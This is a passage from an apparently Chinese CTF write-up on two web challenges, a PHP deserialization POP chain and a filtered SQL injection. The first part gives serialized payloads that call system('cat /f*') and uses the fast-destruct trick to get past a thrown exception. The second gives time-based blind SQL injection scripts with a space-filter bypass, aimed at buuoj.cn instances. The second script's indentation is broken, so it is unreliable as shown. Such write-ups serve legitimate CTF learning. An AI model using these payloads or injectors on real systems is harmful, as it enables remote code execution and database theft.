class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br><span class="line">Fatal error: Uncaught <span class="built_in">Exception</span>: Nope in /<span class="keyword">var</span>/www/html/index.php:<span class="number">55</span> Stack trace: <span class="comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POP链：__destruct()-&gt;__toString()-&gt;__get($var)-&gt;__invoke()-&gt;Web</span><br></pre></td></tr></table></figure>

<p>所以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class Start&#123;</span><br><span class="line">    public $errMsg;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Pwn&#123;</span><br><span class="line">    public $obj;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Reverse&#123;</span><br><span class="line">    public $func;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Web&#123;</span><br><span class="line">    public $func = &#x27;system&#x27;;</span><br><span class="line">    public $var = &#x27;ls /&#x27;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Crypto&#123;</span><br><span class="line">    public $obj;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Misc&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">$a = new Start();</span><br><span class="line">$a-&gt;errMsg = new Crypto();</span><br><span class="line">$a-&gt;errMsg-&gt;obj = new Reverse();</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func = new Pwn();</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = new Web();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9732ffc.png" alt="image-20240205180018670"></p>
<p>O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:4:”ls &#x2F;“;}}}}}</p>
<p>上传 仍报错</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa961ce7e.png" alt="image-20240205180134443"></p>
<p>这是因为代码里面扔了个异常</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa94d0ff3.png" alt="image-20240205180221381"></p>
<p>这会导致在反序列化之后直接经过异常报错 导致后边的析构函数__destruct()无法触发</p>
<p>所以需要Fast destruct</p>
<p>1.修改序列化数字元素个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">改成</span><br><span class="line">O:5:&quot;Start&quot;:2:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641a0dd13fd7.png" alt="image-20240205180429122"></p>
<p>O:5:”Start”:2:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630ea1d7a.png" alt="image-20240205180917410"></p>
<p><code> </code>flag{aa977e39-9133-4995-9ba1-a75aae77b57f}</p>
<p>2.去掉序列化尾部 }</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">改成</span><br><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630e5aba2.png" alt="image-20240205181044938"></p>
<p>O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641630eda87b.png" alt="image-20240205181123821"></p>
<p>flag{aa977e39-9133-4995-9ba1-a75aae77b57f}</p>
<h3 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6642328bd907b.png" alt="image-20240205182352427"></p>
<p>随便传一下</p>
<p>在url中发现id应该是注入点</p>
<p>被过滤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6642328b53bcf.png" alt="image-20240205182849525"></p>
<p>union没过滤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/14/664379daadf67.png" alt="image-20240205182916033"></p>
<p>select没过滤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9f64d10.png" alt="image-20240205182951444"></p>
<p>2‘也没有</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9e88e8d.png" alt="image-20240205183024376"></p>
<p>说明过滤了空格</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9f034f3.png" alt="image-20240205183131864"></p>
<p>没问题 无回显</p>
<p>用&#x2F;**&#x2F;代替空格</p>
<p>使用时间盲注来</p>
<p>脚本1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="comment"># from tqdm import trange</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;93af9711-9ca0-455a-977c-d562bb88a211.node4.buuoj.cn:81/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://93af9711-9ca0-455a-977c-d562bb88a211.node4.buuoj.cn:81/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>, <span class="number">31</span>, -<span class="number">1</span>):</span><br><span class="line">        url = <span class="string">r&#x27;http://93af9711-9ca0-455a-977c-d562bb88a211.node4.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27; # information_schema,mysql,performance_schema,sys,test,ctf</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/database()),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&quot;ctf&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27; # id,name,price</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        payload = <span class="string">rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;j&#125;</span>),sleep(4),0)&#x27;</span></span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url=url, timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            <span class="comment"># print(chr(j+1))</span></span><br><span class="line">            res += <span class="built_in">chr</span>(j + <span class="number">1</span>)</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] &#x27;</span> + res)</span><br></pre></td></tr></table></figure>

<p>脚本2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re,copy</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gadget</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_val, exc_tb</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params">self,string:<span class="built_in">str</span></span>):</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">            result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(c))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+result.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="comment"># index start from 1</span></span><br><span class="line">        <span class="comment">#注意要把脚本中的空格改成/**/</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">get_char_ascii</span>(<span class="params">self,string:<span class="built_in">str</span>,index</span>):</span><br><span class="line">            method1 = <span class="string">f&#x27;(Ord(right(left(<span class="subst">&#123;string&#125;</span>,<span class="subst">&#123;index&#125;</span>),1)))&#x27;</span></span><br><span class="line">            method2 = <span class="string">f&#x27;(Ord(substr(<span class="subst">&#123;string&#125;</span>/**/from/**/<span class="subst">&#123;index&#125;</span>/**/for/**/1)))&#x27;</span></span><br><span class="line">            method3 = <span class="string">f&#x27;(Ord(sUbstr(<span class="subst">&#123;string&#125;</span> frOm <span class="subst">&#123;index&#125;</span> fOr 1)))&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> method2</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">table_name_in_db</span>(<span class="params">self</span>):</span><br><span class="line">            s1 = <span class="string">&#x27;(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))&#x27;</span> <span class="comment"># mysql &gt; 5.6</span></span><br><span class="line">            s2 = <span class="string">&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))&#x27;</span></span><br><span class="line">            s3 = <span class="string">&#x27;(Select(group_coNcat(table_name))frOm(infOrmation_schema.tables)wHere((table_schema)In(dAtabase())))&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> s3</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">table_name_in_db2</span>(<span class="params">self, schema_name</span>):</span><br><span class="line">            s1 = <span class="string">&#x27;(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))&#x27;</span> <span class="comment"># mysql &gt; 5.6</span></span><br><span class="line">            s2 = <span class="string">&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))&#x27;</span></span><br><span class="line">            s3 = <span class="string">f&quot;(Select(group_coNcat(table_name))frOm(infOrmation_schema.tables)wHere((table_schema)In(&#x27;<span class="subst">&#123;schema_name&#125;</span>&#x27;)))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s3</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">db_names</span>(<span class="params">self</span>):</span><br><span class="line">            s1 = <span class="string">&#x27;(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))&#x27;</span> <span class="comment"># mysql &gt; 5.6</span></span><br><span class="line">            s2 = <span class="string">&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))&#x27;</span></span><br><span class="line">            s3 = <span class="string">f&quot;(sElect(group_coNcat(sChema_name))from(information_schema.schemata))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s3</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">column_name_in_table</span>(<span class="params">self,table_name:<span class="built_in">str</span></span>):</span><br><span class="line">            s1 = <span class="string">f&quot;(select(group_concat(column_name))from(infOrmation_schema.columns)where(table_name)in(&#x27;<span class="subst">&#123;table_name&#125;</span>&#x27;))&quot;</span></span><br><span class="line">            s2 = <span class="string">f&quot;(sElect(group_cOncat(Column_name))frOm(infOrmation_schema.cOlumns)wHere(table_name)In(<span class="subst">&#123;self.str2hex(table_name)&#125;</span>))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s2</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">column_value_in_table</span>(<span class="params">self,table_name:<span class="built_in">str</span>,column_name:<span class="built_in">str</span></span>):</span><br><span class="line">            s1 = <span class="string">f&quot;(sElect(grOup_cOncat(<span class="subst">&#123;column_name&#125;</span>))frOm(<span class="subst">&#123;table_name&#125;</span>))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">get_len</span>(<span class="params">self,function,*args, **kwargs</span>):</span><br><span class="line">            s1 = <span class="string">f&#x27;(lenGth(<span class="subst">&#123;function(*args, **kwargs)&#125;</span>))&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">ascii_equal</span>(<span class="params">self,asc,i</span>):</span><br><span class="line">            s1 = <span class="string">f&quot;((<span class="subst">&#123;asc&#125;</span>)in(<span class="subst">&#123;i&#125;</span>))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">len_equal</span>(<span class="params">self,<span class="built_in">len</span>,i</span>):</span><br><span class="line">            s1 = <span class="string">f&quot;((<span class="subst">&#123;<span class="built_in">len</span>&#125;</span>)in(<span class="subst">&#123;i&#125;</span>))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">ascii_greater</span>(<span class="params">self,asc,i</span>):</span><br><span class="line">            s1 = <span class="string">f&quot;(leAst(<span class="subst">&#123;asc&#125;</span>,<span class="subst">&#123;i&#125;</span>)in(<span class="subst">&#123;i&#125;</span>))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">judge</span>(<span class="params">self,cond</span>):</span><br><span class="line">            s2 = <span class="string">f&quot;Elt((<span class="subst">&#123;cond&#125;</span>)+1,sLeep(1),0)&quot;</span></span><br><span class="line">            s1 = <span class="string">f&quot;(iF((<span class="subst">&#123;cond&#125;</span>),sLeep(1),0))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Injector</span>():</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,url,method,inject_param,data=<span class="literal">None</span>,debug=<span class="literal">True</span></span>):</span><br><span class="line">            self.url = url</span><br><span class="line">            self.method = method</span><br><span class="line">            self.data = data</span><br><span class="line">            self.inject_param = inject_param</span><br><span class="line">            self.debug = debug</span><br><span class="line">            self.gadget = Gadget()</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">condition</span>(<span class="params">self,res</span>):</span><br><span class="line">            <span class="keyword">if</span> res.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">handle_value</span>(<span class="params">self,function, *args, **kwargs</span>):</span><br><span class="line">            result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            data = copy.deepcopy(self.data)</span><br><span class="line">            <span class="keyword">for</span> _time <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;time:%d&quot;</span> % (_time + <span class="number">1</span>))</span><br><span class="line">                left = <span class="number">32</span></span><br><span class="line">                right = <span class="number">128</span></span><br><span class="line">                updated = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">while</span> (right &gt; left):</span><br><span class="line">                    mid = (left + right) // <span class="number">2</span></span><br><span class="line">                    <span class="keyword">with</span> self.gadget <span class="keyword">as</span> g:</span><br><span class="line">                        data[self.inject_param] = self.data[self.inject_param].replace(<span class="string">&#x27;XXXXX&#x27;</span>,g.judge(g.ascii_equal(g.get_char_ascii(function(*args, **kwargs),_time+<span class="number">1</span>),mid)))</span><br><span class="line">                    res = <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">if</span> self.method == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">                        res = requests.get(self.url,data)</span><br><span class="line">                        <span class="keyword">if</span> self.debug:</span><br><span class="line">                            <span class="comment">#print(res.text)</span></span><br><span class="line">                            <span class="built_in">print</span>(res.request.url)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            res = requests.post(self.url,data)</span><br><span class="line">                            <span class="keyword">if</span> self.debug:</span><br><span class="line">                                <span class="built_in">print</span>(res.text)</span><br><span class="line">                        <span class="keyword">if</span> (self.condition(res)):</span><br><span class="line">                            result+=<span class="built_in">chr</span>(mid)</span><br><span class="line">                            <span class="built_in">print</span>(result)</span><br><span class="line">                            updated = <span class="literal">True</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">with</span> self.gadget <span class="keyword">as</span> g:</span><br><span class="line">                                data[self.inject_param] = self.data[self.inject_param].replace(<span class="string">&#x27;XXXXX&#x27;</span>,g.judge(g.ascii_greater(g.get_char_ascii(function(*args, **kwargs),_time+<span class="number">1</span>),mid)))</span><br><span class="line">                            res = <span class="literal">None</span></span><br><span class="line">                            <span class="keyword">if</span> self.method == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">                                res = requests.get(self.url, data)</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                res = requests.post(self.url, data)</span><br><span class="line">                            <span class="keyword">if</span> (self.condition(res)):</span><br><span class="line">                                left = mid</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                right = mid</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> updated :</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">handle_len</span>(<span class="params">self,function, *args, **kwargs</span>):</span><br><span class="line">                data = copy.deepcopy(self.data)</span><br><span class="line">                <span class="keyword">for</span> _time <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;time:%d&quot;</span> % (_time))</span><br><span class="line">                    <span class="keyword">with</span> self.gadget <span class="keyword">as</span> g:</span><br><span class="line">                        data[self.inject_param] =  self.data[self.inject_param].replace(<span class="string">&#x27;XXXXX&#x27;</span>,g.judge(g.len_equal(g.get_len(function,*args, **kwargs),_time)))</span><br><span class="line">                    res = <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">if</span> self.method == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">                        res = requests.get(self.url, data)</span><br><span class="line">                        <span class="keyword">if</span> self.debug:</span><br><span class="line">                            <span class="built_in">print</span>(res.request.url)</span><br><span class="line">                            <span class="built_in">print</span>(res.text)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        res = requests.post(self.url, data)</span><br><span class="line">                        <span class="keyword">if</span> self.debug:</span><br><span class="line">                            <span class="built_in">print</span>(res.text)</span><br><span class="line">                    <span class="keyword">if</span> (self.condition(res)):</span><br><span class="line">                        <span class="built_in">print</span>(_time)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Note:</span></span><br><span class="line"><span class="string">    Use time-based injection by default.</span></span><br><span class="line"><span class="string">Todo:</span></span><br><span class="line"><span class="string">    union injection</span></span><br><span class="line"><span class="string">    bool injection</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    g = Gadget()</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://7e6750f1-d557-49a6-bea9-ecfe9513b376.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">    inject_param = <span class="string">&#x27;id&#x27;</span></span><br><span class="line">    <span class="comment"># XXXXX 会被替换为 if(,sleep(1.5),0)</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1/**/Or/**/XXXXX#&quot;</span>&#125;</span><br><span class="line">    inj = Injector(url,method=<span 